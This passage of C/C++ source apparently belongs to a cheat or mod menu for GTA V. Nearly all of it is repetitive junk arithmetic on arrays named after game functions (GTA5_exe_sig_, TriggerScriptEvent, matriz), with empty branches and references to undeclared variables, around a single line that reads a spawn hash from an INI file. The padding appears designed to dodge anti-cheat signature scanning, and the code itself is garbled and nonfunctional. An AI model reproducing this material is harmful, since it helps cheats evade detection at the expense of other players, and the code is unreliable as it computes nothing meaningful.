				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				Spawn.Hash = Extern_Reader::INIFile::Int::LerInt(buffer, "Hash");

				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
